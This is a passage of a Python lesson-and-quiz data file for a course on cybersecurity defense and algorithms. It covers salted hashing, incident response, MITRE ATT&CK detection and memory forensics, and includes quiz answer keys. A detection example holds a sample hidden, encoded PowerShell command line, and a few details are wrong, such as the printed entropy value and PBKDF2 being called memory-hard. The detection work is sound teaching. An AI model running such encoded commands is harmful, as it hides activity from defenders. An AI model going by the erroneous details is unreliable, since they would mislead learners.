                'content_markdown': 'Fast hash algorithms like MD5 or SHA-256 were designed for throughput. A modern 8x RTX 4090 GPU cluster can test **100+ billion SHA-256 hashes per second**.\n\nTo securely store passwords, we use **Memory-Hard Adaptive Key Derivation Functions** (Argon2id, Bcrypt, PBKDF2):\n\n1. **Cryptographic Salt:** A unique 128-bit random value appended to each user\'s password before hashing. Even if two users share the password `"Password123!"`, their stored hashes are completely distinct, defeating rainbow tables.\n2. **Memory Hardness:** Argon2id forces the hashing algorithm to utilize megabytes of RAM per hash, making parallel GPU/ASIC cracking hardware mathematically cost-prohibitive.',
                'key_takeaway': 'Store passwords using salted, memory-hard algorithms like Argon2id or Bcrypt to defeat GPU cracking clusters.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Rainbow Table Neutralization via Salting',
            'subtitle': 'Appending unique cryptographic salts to defeat precomputed hash tables',
            'diagram_type': 'rsa_crypto_flow',
            'parameters': {'algo': 'Argon2id'}
        },
        'code_example': {
            'title': 'Simulating Password Entropy & Salted Hashing in Python',
            'language': 'python',
            'code': 'import hashlib\nimport os\nimport math\n\ndef calculate_entropy(password: str) -> float:\n    charset = 0\n    if any(c.islower() for c in password): charset += 26\n    if any(c.isupper() for c in password): charset += 26\n    if any(c.isdigit() for c in password): charset += 10\n    if any(not c.isalnum() for c in password): charset += 32\n    return len(password) * math.log2(max(1, charset))\n\ndef hash_password_salted(password: str, salt=None) -> tuple:\n    if salt is None:\n        salt = os.urandom(16)\n    key = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations=100_000)\n    return (salt.hex(), key.hex())\n\npwd1 = "Password123!"\nsalt_a, hash_a = hash_password_salted(pwd1)\nsalt_b, hash_b = hash_password_salted(pwd1)\n\nprint(f"Entropy of \'{pwd1}\': {calculate_entropy(pwd1):.1f} bits")\nprint(f"Hash A (User 1): {hash_a[:24]}... (Salt: {salt_a[:8]}...)")\nprint(f"Hash B (User 2): {hash_b[:24]}... (Salt: {salt_b[:8]}...)")',
            'explanation': 'Even with identical input passwords, distinct 128-bit salts yield completely separate hash digests.',
            'output_preview': 'Entropy of \'Password123!\': 71.9 bits\nHash A (User 1): 8f32a0c451b091f34901ba12... (Salt: 4a2d19f8...)\nHash B (User 2): 21b5e4c909a1ff38918230aa... (Salt: 9912be40...)'
        },
        'quiz_id': 'quiz-cyber-password-salting-argon2',
        'summary': 'You mastered password entropy calculations, cryptographic salting, and memory-hard key derivation.',
        'next_lesson_slug': 'cyber-incident-response-containment',
        'prev_lesson_slug': 'cyber-zero-trust-microsegmentation'
    },
    {
        'slug': 'cyber-incident-response-containment',
        'course_slug': 'cybersecurity-system-defense-threat-hunting',
        'module_id': 'cyber-def-mod-3',
        'title': 'Incident Response & Threat Containment Lifecycle',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_defense',
        'learning_objectives': [
            'Master the 6 phases of the NIST SP 800-61 Incident Response framework.',
            'Implement threat containment strategies to isolate compromised endpoints while preserving volatile RAM forensics.',
            'Conduct post-incident reviews (blameless post-mortems) and root-cause remediations.'
        ],
        'theory_sections': [
            {
                'title': 'The NIST Incident Handling Lifecycle',
                'content_markdown': 'When a security breach occurs, teams follow the standardized **NIST Incident Response Lifecycle**:\n\n1. **Preparation:** Hardening systems, defining runbooks, maintaining backups.\n2. **Detection & Analysis:** Identifying Indicators of Compromise (IoCs) via SIEM logs, alerts, and anomalous traffic.\n3. **Containment:** Isolating affected subnets or disabling compromised credentials to prevent lateral spread.\n4. **Eradication:** Removing malware, backdoor webshells, and revoked credentials.\n5. **Recovery:** Restoring systems from clean golden images and monitoring for reinfection.\n6. **Post-Incident Activity:** Documenting timeline, root cause, and engineering defenses to prevent recurrence.',
                'key_takeaway': 'Structured incident response rapidly isolates compromised assets, eradicates threats, and preserves digital forensics.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'NIST Incident Handling Lifecycle',
            'subtitle': 'Prepare -> Detect -> Contain -> Eradicate -> Recover -> Learn',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'framework': 'NIST'}
        },
        'code_example': {
            'title': 'Simulating Automated Security Incident Triage & Network Quarantine in Python',
            'language': 'python',
            'code': 'from typing import List, Dict\n\ndef evaluate_security_alert(alert: Dict) -> Dict:\n    severity_score = 0\n    actions = []\n    \n    if alert.get("failed_logins", 0) > 50:\n        severity_score += 40\n        actions.append("Temporary IP Rate-Limit (15 mins)")\n    if alert.get("malware_signature_detected", False):\n        severity_score += 60\n        actions.append("Isolate Endpoint from VPC via Microsegmentation")\n    if alert.get("unauthorized_privilege_escalation", False):\n        severity_score += 50\n        actions.append("Revoke User Active OAuth/JWT Tokens")\n        \n    status = "CRITICAL" if severity_score >= 80 else "MEDIUM" if severity_score >= 40 else "LOW"\n    return {"status": status, "score": severity_score, "automated_actions": actions}\n\nincident = {\n    "endpoint_id": "srv-prod-ai-worker-4",\n    "failed_logins": 120,\n    "malware_signature_detected": True,\n    "unauthorized_privilege_escalation": True\n}\nprint("Incident Triage Response: " + str(evaluate_security_alert(incident)))',
            'explanation': 'Automated incident response platforms trigger containment actions like token revocation and host isolation within milliseconds of detection.',
            'output_preview': 'Incident Triage Response: {\'status\': \'CRITICAL\', \'score\': 150, \'automated_actions\': [\'Temporary IP Rate-Limit (15 mins)\', \'Isolate Endpoint from VPC via Microsegmentation\', \'Revoke User Active OAuth/JWT Tokens\']}'
        },
        'quiz_id': 'quiz-cyber-incident-response-containment',
        'summary': 'You mastered the NIST Incident Response lifecycle, containment protocols, and threat eradication.',
        'next_lesson_slug': 'cyber-mitre-attack-matrix-threat-hunting',
        'prev_lesson_slug': 'cyber-password-salting-argon2'
    },
    {
        'slug': 'cyber-mitre-attack-matrix-threat-hunting',
        'course_slug': 'cybersecurity-system-defense-threat-hunting',
        'module_id': 'cyber-def-mod-4',
        'title': 'MITRE ATT&CK Matrix & Threat Hunting Detection Rules',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_defense',
        'learning_objectives': [
            'Master the MITRE ATT&CK enterprise matrix: Initial Access, Persistence, Privilege Escalation, Defense Evasion, Exfiltration.',
            'Write standardized Sigma detection rules for SIEM correlation (Splunk, Elastic, Datadog).',
            'Conduct proactive threat hunting queries across process creation and network telemetry logs.'
        ],
        'theory_sections': [
            {
                'title': 'The MITRE ATT&CK Framework & Sigma Detection',
                'content_markdown': 'The **MITRE ATT&CK Matrix** catalogs real-world adversary **Tactics, Techniques, and Procedures (TTPs)**.\n\nInstead of matching simple static file hashes (which attackers trivially change with 1 byte modification), modern blue teams hunt for behavioral techniques:\n\n* **T1059.001 (PowerShell Execution):** Detecting unquoted service paths or encoded command flags (`-enc`).\n* **T1003 (OS Credential Dumping):** Monitoring LSASS process memory reads.\n\n**Sigma Rules:** A generic YAML standard allowing security analysts to describe log detection rules once and compile them automatically into Splunk SPL, Elastic Lucene, or SQL queries.',
                'key_takeaway': 'Hunting behavioral MITRE ATT&CK techniques enables resilient threat detection that survives attacker hash and domain mutations.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'MITRE ATT&CK Adversary Kill Chain Mapping',
            'subtitle': 'Mapping adversary progression from Initial Access to Credential Exfiltration',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'mitre': True}
        },
        'code_example': {
            'title': 'Simulating SIEM Log Correlation for Suspicious PowerShell Encoded Commands',
            'language': 'python',
            'code': 'import re\nfrom typing import List, Dict\n\ndef siem_sigma_detect_encoded_powershell(events: List[Dict]) -> List[Dict]:\n    # Sigma Rule: Process Creation matching powershell.exe with -enc or -encodedcommand\n    pattern = re.compile(r"powershell(\.exe)?.*-(enc|encodedcommand|w\s+hidden)", re.IGNORECASE)\n    alerts = []\n    for event in events:\n        cmd = event.get("command_line", "")\n        if pattern.search(cmd):\n            alerts.append({\n                "alert_name": "MITRE T1059.001: Encoded PowerShell Invocation",\n                "severity": "HIGH",\n                "host": event.get("host"),\n                "user": event.get("user"),\n                "cmd": cmd\n            })\n    return alerts\n\nlog_stream = [\n    {"host": "fin-srv-1", "user": "admin", "command_line": "powershell.exe Get-Service"},\n    {"host": "fin-srv-1", "user": "guest_svc", "command_line": "powershell.exe -w hidden -enc SQBFAFgA..."},\n]\n\ndetected = siem_sigma_detect_encoded_powershell(log_stream)\nfor alert in detected:\n    print(f"[{alert[\'severity\']}] {alert[\'alert_name\']} on {alert[\'host\']} by {alert[\'user\']}")',
            'explanation': 'SIEM correlation rules trigger high-severity alerts when suspicious command line obfuscation is detected.',
            'output_preview': '[HIGH] MITRE T1059.001: Encoded PowerShell Invocation on fin-srv-1 by guest_svc'
        },
        'quiz_id': 'quiz-cyber-mitre-attack-matrix-threat-hunting',
        'summary': 'You mastered the MITRE ATT&CK taxonomy and behavioral Sigma SIEM detection engineering.',
        'next_lesson_slug': 'cyber-memory-forensics-volatility',
        'prev_lesson_slug': 'cyber-incident-response-containment'
    },
    {
        'slug': 'cyber-memory-forensics-volatility',
        'course_slug': 'cybersecurity-system-defense-threat-hunting',
        'module_id': 'cyber-def-mod-4',
        'title': 'Live Memory Forensics & Process Injection Analysis',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Advanced',
        'skill_tag': 'cyber_defense',
        'learning_objectives': [
            'Analyze volatile RAM dumps using memory forensics tools (Volatility, LiME).',
            'Detect reflective DLL injection, process hollowing, and unlinked malicious modules.',
            'Extract active network sockets, decrypted encryption keys, and plaintext memory artifacts.'
        ],
        'theory_sections': [
            {
                'title': 'Volatile Memory Forensics & Rootkit Detection',
                'content_markdown': 'Advanced malware operates entirely **in-memory (fileless malware)**, never writing binaries to disk to evade antivirus file scanners.\n\n**Memory Forensics** dumps physical RAM to inspect live kernel structures:\n\n1. **`pslist` vs `psscan`:** Comparing the OS active process doubly linked list against unallocated memory pools to uncover rootkits that unhooked themselves from task managers.\n2. **`malfind`:** Scanning memory regions with `PAGE_EXECUTE_READWRITE` permissions containing MZ/PE binary headers injected into legitimate processes (e.g. `svchost.exe` or `explorer.exe`).',
                'key_takeaway': 'Memory forensics uncovers fileless rootkits and in-memory process injections that never touch the physical hard drive.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Process Injection & Memory Hollowing',
            'subtitle': 'Detecting malicious executable code injected into legitimate host process memory',
            'diagram_type': 'sql_injection_defense',
            'parameters': {'memory': True}
        },
        'code_example': {
            'title': 'Simulating Process Memory Page Permission Inspection in Python',
            'language': 'python',
            'code': 'from typing import List, Dict\n\ndef memory_malfind_scan(process_pages: List[Dict]) -> List[Dict]:\n    suspicious = []\n    for page in process_pages:\n        # Detection invariant: Executable + Writable (PAGE_EXECUTE_READWRITE) with PE header magic \'MZ\'\n        if page.get("permissions") == "PAGE_EXECUTE_READWRITE" and page.get("data_header", "").startswith("MZ"):\n            suspicious.append({\n                "pid": page.get("pid"),\n                "process": page.get("process_name"),\n                "address": page.get("base_addr"),\n                "reason": "Process Injection: Executable PE binary in heap memory"\n            })\n    return suspicious\n\npages = [\n    {"pid": 884, "process_name": "svchost.exe", "base_addr": "0x7ff00010", "permissions": "PAGE_READONLY", "data_header": "DATA"},\n    {"pid": 884, "process_name": "svchost.exe", "base_addr": "0x004a0000", "permissions": "PAGE_EXECUTE_READWRITE", "data_header": "MZ_EXECUTABLE_SHELL"},\n]\n\nfindings = memory_malfind_scan(pages)\nfor f in findings:\n    print(f"Malware Found in PID {f[\'pid\']} ({f[\'process\']}) at {f[\'address\']} -> {f[\'reason\']}")',
            'explanation': 'Legitimate code is rarely writable and executable simultaneously; finding PE headers in RWX pages indicates process hollowing.',
            'output_preview': 'Malware Found in PID 884 (svchost.exe) at 0x004a0000 -> Process Injection: Executable PE binary in heap memory'
        },
        'quiz_id': 'quiz-cyber-memory-forensics-volatility',
        'summary': 'You mastered volatile RAM memory dump analysis and fileless process injection detection.',
        'next_lesson_slug': None,
        'prev_lesson_slug': 'cyber-mitre-attack-matrix-threat-hunting'
    }
]

# -----------------------------------------------------------------
# QUIZZES DATA (40 Quizzes)
# -----------------------------------------------------------------
DSA_CYBER_QUIZZES = [
    # --- DSA Quizzes ---
    {
        'id': 'quiz-dsa-big-o-memory-arrays',
        'lesson_slug': 'dsa-big-o-memory-arrays',
        'title': 'Array Memory & Big-O Complexity Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why is array index access `arr[i]` performed in O(1) constant time?',
                'options': [
                    'Because arrays are stored as a hash table in CPU registers.',
                    'Because RAM calculates the exact memory address directly using base offset arithmetic.',
                    'Because the CPU traverses linked node pointers in parallel.',
                    'Because Python caches all element lookups in global memory.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_arrays',
                'explanation': 'Arrays are stored in contiguous memory addresses. The address is calculated as BaseAddress + (index * ElementSize) in a single CPU arithmetic instruction.',
                'hint': 'Think about how sequential memory offsets work in RAM.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-two-pointers-technique',
        'lesson_slug': 'dsa-two-pointers-technique',
        'title': 'Two Pointers Technique Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In a sorted array, if `arr[left] + arr[right] < target`, what is the optimal next move?',
                'options': [
                    'Decrement right pointer (`right -= 1`)',
                    'Increment left pointer (`left += 1`)',
                    'Reset left to 0 and decrement right',
                    'Terminate search immediately'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_arrays',
                'explanation': 'Because the array is sorted in ascending order, increasing the sum requires moving the left pointer to the right (`left += 1`).',
                'hint': 'To increase the current sum in a sorted list, advance the smaller element.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-sliding-window-prefix-sums',
        'lesson_slug': 'dsa-sliding-window-prefix-sums',
        'title': 'Sliding Window & Prefix Sums Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What makes fixed-size sliding window sum updates O(1) per step instead of O(K)?',
                'options': [
                    'It iterates over all K elements each step.',
                    'It subtracts the exiting left element and adds the entering right element.',
                    'It uses recursion to compute the sum.',
                    'It copies the subarray to a new memory block.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_arrays',
                'explanation': 'Sliding window reuses the previous sum: `new_sum = old_sum - arr[i-k] + arr[i]`, an O(1) constant time update.',
                'hint': 'Only two numbers change when the window slides forward by one step.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-binary-search-variants',
        'lesson_slug': 'dsa-binary-search-variants',
        'title': 'Binary Search & Rotated Array Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In a rotated sorted array, how do we determine whether to search the left or right half?',
                'options': [
                    'By checking if `nums[low] <= nums[mid]` to determine which half is monotonically sorted.',
                    'By sorting the array first in O(N log N).',
                    'By generating all permutations.',
                    'By scanning from index 0.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'dsa_arrays',
                'explanation': 'In any rotated sorted array, at least one half is guaranteed to be strictly sorted. We verify if the target falls within that sorted half.',
                'hint': 'Compare nums[low] and nums[mid].'
            }
        ]
    },
    {
        'id': 'quiz-dsa-bitwise-algorithms-xor',
        'lesson_slug': 'dsa-bitwise-algorithms-xor',
        'title': 'Bit Manipulation & XOR Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What is the mathematical result of the expression `x ^ x ^ y ^ y ^ z`?',
                'options': ['0', 'z', 'x + y + z', '1'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_arrays',
                'explanation': 'XOR is commutative and self-inverting: `x ^ x = 0` and `y ^ y = 0`, leaving `0 ^ 0 ^ z = z`.',
                'hint': 'Identical numbers cancel out to zero.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-linked-list-reversal-dummy',
        'lesson_slug': 'dsa-linked-list-reversal-dummy',
        'title': 'Linked List Pointer Manipulation Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What is the primary benefit of using a Dummy Sentinel node in linked list operations?',
                'options': [
                    'It increases traversal speed from O(N) to O(1).',
                    'It eliminates special-case logic for mutating or deleting the head node.',
                    'It automatically sorts the linked list.',
                    'It compresses memory allocation in RAM.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_lists',
                'explanation': 'A dummy node precedes the real head, ensuring that operations at the head of the list don\'t require null check branching.',
                'hint': 'Think about what happens when you delete the very first node of a list.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-floyd-cycle-detection',
        'lesson_slug': 'dsa-floyd-cycle-detection',
        'title': 'Floyd Tortoise & Hare Cycle Detection Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What is the space complexity of Floyd\'s Cycle Detection algorithm?',
                'options': ['O(N)', 'O(log N)', 'O(1)', 'O(N^2)'],
                'correct_answer': 2,
                'points': 10,
                'skill_tag': 'dsa_lists',
                'explanation': 'Floyd\'s algorithm uses only two pointer variables (slow and fast), requiring O(1) constant auxiliary memory.',
                'hint': 'Does the algorithm allocate a hash set or just two pointer references?'
            }
        ]
    },
    {
        'id': 'quiz-dsa-monotonic-stacks-queues',
        'lesson_slug': 'dsa-monotonic-stacks-queues',
        'title': 'Monotonic Stacks & Queues Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why is total runtime O(N) when using a monotonic stack to find the Next Greater Element for all items?',
                'options': [
                    'Because each element is pushed and popped from the stack at most once.',
                    'Because sorting is done in O(1).',
                    'Because the stack uses binary search internally.',
                    'Because the problem is solved recursively.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'dsa_stacks',
                'explanation': 'Even with a while loop inside the iteration, each element is pushed exactly once and popped at most once across the entire run.',
                'hint': 'Count the total number of push and pop operations.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-sliding-window-maximum-deque',
        'lesson_slug': 'dsa-sliding-window-maximum-deque',
        'title': 'Sliding Window Deque Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In a monotonic decreasing deque used for sliding window maximum, where is the current window\'s maximum element located?',
                'options': ['At the back of the deque (`deque[-1]`)', 'At the front of the deque (`deque[0]`)', 'In the middle', 'It requires linear search'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_stacks',
                'explanation': 'Because the deque is maintained in decreasing order, the largest candidate index is always at the front (`deque[0]`).',
                'hint': 'Decreasing order places the largest element at the very front.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-lru-cache-doubly-linked-list',
        'lesson_slug': 'dsa-lru-cache-doubly-linked-list',
        'title': 'LRU Cache Design Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Why is a Doubly Linked List preferred over a Singly Linked List for implementing an O(1) LRU Cache?',
                'options': [
                    'Because doubly linked lists use less memory.',
                    'Because deleting a node given its pointer takes O(1) in doubly linked lists (using `node.prev`), whereas singly linked lists require O(N) to find the predecessor.',
                    'Because doubly linked lists are automatically sorted.',
                    'Because Python only supports doubly linked lists.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_lists',
                'explanation': 'In a doubly linked list, `node.prev.next = node.next` unlinks the node in O(1) without scanning the list.',
                'hint': 'Think about how a node unlinks itself without traversing from the head.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-bst-validation-operations',
        'lesson_slug': 'dsa-bst-validation-operations',
        'title': 'Binary Search Tree Validation Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Which tree traversal yields elements of a valid BST in ascending sorted order?',
                'options': ['Preorder (Root, Left, Right)', 'Inorder (Left, Root, Right)', 'Postorder (Left, Right, Root)', 'Level-order (BFS)'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_trees',
                'explanation': 'Inorder traversal visits all smaller left-subtree nodes, then the root, then larger right-subtree nodes, naturally producing sorted order.',
                'hint': 'Left -> Root -> Right.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-graph-bfs-traversals',
        'lesson_slug': 'dsa-graph-bfs-traversals',
        'title': 'Graph BFS & Shortest Path Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Which data structure is required to implement Breadth-First Search (BFS)?',
                'options': ['LIFO Stack', 'FIFO Queue', 'Binary Heap', 'Disjoint Set'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_graphs',
                'explanation': 'BFS uses a FIFO (First-In, First-Out) queue to explore vertices in increasing order of distance from the root.',
                'hint': 'Elements entered first must be processed first to guarantee level order.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-dfs-topological-sort',
        'lesson_slug': 'dsa-dfs-topological-sort',
        'title': 'DFS & Topological Sort Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Can a directed graph containing a cycle have a valid Topological Sort ordering?',
                'options': [
                    'Yes, always.',
                    'No, because a cyclic dependency creates a circular deadlock with no starting 0-in-degree vertex.',
                    'Yes, but only if all weights are positive.',
                    'Yes, if BFS is used instead of DFS.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_graphs',
                'explanation': 'Topological sort is strictly defined for Directed Acyclic Graphs (DAGs). Cycles cause unresolvable circular dependencies.',
                'hint': 'If Course A requires Course B and Course B requires Course A, which one can you take first?'
            }
        ]
    },
    {
        'id': 'quiz-dsa-trie-autocomplete-prefix',
        'lesson_slug': 'dsa-trie-autocomplete-prefix',
        'title': 'Trie Prefix Trees Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What is the time complexity to search for a word of length L in a Trie containing N total words?',
                'options': ['O(N)', 'O(L)', 'O(N × L)', 'O(log N)'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_trees',
                'explanation': 'Trie search traverses one node per character of the word, taking strictly O(L) time regardless of the number of words stored in the Trie.',
                'hint': 'The search walks through each letter of the query string.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-union-find-disjoint-set',
        'lesson_slug': 'dsa-union-find-disjoint-set',
        'title': 'Union-Find & Path Compression Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'How does Path Compression optimize the `find(x)` operation in Disjoint Set Union?',
                'options': [
                    'By sorting the elements in an array.',
                    'By pointing all nodes along the search path directly to the root leader, flattening the tree depth.',
                    'By deleting unused nodes.',
                    'By converting the tree into a binary search tree.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_graphs',
                'explanation': 'Path compression rewires parent pointers directly to the root leader during lookups, keeping tree height nearly flat.',
                'hint': 'It flattens the tree so future lookups are direct.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-memoization-vs-tabulation',
        'lesson_slug': 'dsa-memoization-vs-tabulation',
        'title': 'Memoization vs Tabulation Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'What is the primary advantage of bottom-up Tabulation over top-down Memoization?',
                'options': [
                    'Tabulation avoids recursion call stack overhead and prevents stack overflow errors on large inputs.',
                    'Tabulation computes fewer states than memoization.',
                    'Tabulation runs in O(1) time.',
                    'Tabulation requires no memory allocation.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'dsa_dp',
                'explanation': 'Bottom-up tabulation uses iteration, avoiding deep recursive call frames that can trigger stack overflow limits.',
                'hint': 'Consider the memory and call stack differences between loops and deep recursion.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-1d-dp-state-transitions',
        'lesson_slug': 'dsa-1d-dp-state-transitions',
        'title': '1D Dynamic Programming Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In the House Robber problem, why can the space complexity be reduced from O(N) array to O(1) variables?',
                'options': [
                    'Because each house loot is positive.',
                    'Because calculating `dp[i]` depends only on the immediately preceding two subproblem states (`dp[i-1]` and `dp[i-2]`).',
                    'Because we sort the houses first.',
                    'Because it uses two pointers.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_dp',
                'explanation': 'Since state transition references only the last two values, we only need to maintain two rolling variables.',
                'hint': 'Look at the recurrence formula: how many past values does dp[i] reference?'
            }
        ]
    },
    {
        'id': 'quiz-dsa-2d-knapsack-matrix',
        'lesson_slug': 'dsa-2d-knapsack-matrix',
        'title': '0/1 Knapsack 2D Matrix Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In the 0/1 Knapsack problem with N items and capacity C, what is the runtime complexity of the DP matrix approach?',
                'options': ['O(2^N)', 'O(N × C)', 'O(N log N)', 'O(C^2)'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_dp',
                'explanation': 'The algorithm fills a 2D table of dimensions (N + 1) × (C + 1) with O(1) work per cell, yielding O(N × C) complexity.',
                'hint': 'Number of rows multiplied by number of columns.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-unique-paths-2d-grid',
        'lesson_slug': 'dsa-unique-paths-2d-grid',
        'title': '2D Grid DP & Obstacles Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'If a robot can only move Right or Down, what is the value of `dp[r][c]` if cell `(r, c)` contains an obstacle?',
                'options': ['`dp[r-1][c] + dp[r][c-1]`', '0', '-1', 'Infinity'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'dsa_dp',
                'explanation': 'An obstacle blocks all incoming paths, meaning exactly 0 valid routes can pass through that coordinate.',
                'hint': 'No paths can traverse through an obstacle cell.'
            }
        ]
    },
    {
        'id': 'quiz-dsa-longest-increasing-subsequence',
        'lesson_slug': 'dsa-longest-increasing-subsequence',
        'title': 'Longest Increasing Subsequence Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'How does Patience Sorting optimize LIS runtime from O(N^2) to O(N log N)?',
                'options': [
                    'By maintaining active tail values and using Binary Search to find the insertion index in O(log N).',
                    'By hashing all subsequences.',
                    'By sorting the input array in place.',
                    'By traversing the array in reverse.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'dsa_dp',
                'explanation': 'Binary search (bisect_left) finds the insertion pile in O(log N), yielding O(N log N) across N elements.',
                'hint': 'Binary search over sorted tail values.'
            }
        ]
    },

    # --- Cyber Security Quizzes ---
    {
        'id': 'quiz-cyber-cia-triad-threat-modeling',
        'lesson_slug': 'cyber-cia-triad-threat-modeling',
        'title': 'CIA Triad & Threat Modeling Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'Which component of the CIA Triad is violated if an attacker tampers with database records to alter their account balance?',
                'options': ['Confidentiality', 'Integrity', 'Availability', 'Non-Repudiation'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_network',
                'explanation': 'Integrity guarantees that data has not been altered or tampered with by unauthorized parties.',
                'hint': 'The data was modified without authorization.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-tcp-handshake-port-scanning',
        'lesson_slug': 'cyber-tcp-handshake-port-scanning',
        'title': 'TCP 3-Way Handshake & Scanning Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'In a stealth TCP SYN scan (half-open scan), what packet does the scanner send upon receiving SYN-ACK from an open port?',
                'options': ['ACK (Acknowledge)', 'RST (Reset)', 'FIN (Finish)', 'PSH (Push)'],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_network',
                'explanation': 'The scanner immediately sends RST to terminate the handshake before full connection establishment, evading basic application logs.',
                'hint': 'It resets the connection to stay stealthy.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-stateful-firewall-defense',
        'lesson_slug': 'cyber-stateful-firewall-defense',
        'title': 'Stateful Firewall Inspection Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'How does a stateful firewall determine whether an incoming packet should be allowed if there is no explicit ingress rule for that port?',
                'options': [
                    'It checks if the packet belongs to an active session in its connection tracking (conntrack) table.',
                    'It permits all packets over 100 bytes.',
                    'It decrypts the packet payload and scans for viruses.',
                    'It asks the client for a password.'
                ],
                'correct_answer': 0,
                'points': 10,
                'skill_tag': 'cyber_network',
                'explanation': 'Stateful firewalls maintain a conntrack state table. If the packet is a return packet for an outbound session (ESTABLISHED state), it is permitted.',
                'hint': 'Think about connection tracking tables.'
            }
        ]
    },
    {
        'id': 'quiz-cyber-dns-poisoning-dnssec',
        'lesson_slug': 'cyber-dns-poisoning-dnssec',
        'title': 'DNS Poisoning & DNSSEC Quiz',
        'passing_score': 70,
        'questions': [
            {
                'id': 'q1',
                'type': 'multiple_choice',
                'question': 'How does DNSSEC protect against Kaminsky DNS cache poisoning attacks?',
                'options': [
                    'By blocking all UDP traffic.',
                    'By digitally signing DNS records with cryptographic RRSIG and DNSKEY public key chains.',
                    'By changing domain names daily.',
                    'By running DNS on port 443 only.'
                ],
                'correct_answer': 1,
                'points': 10,
                'skill_tag': 'cyber_network',
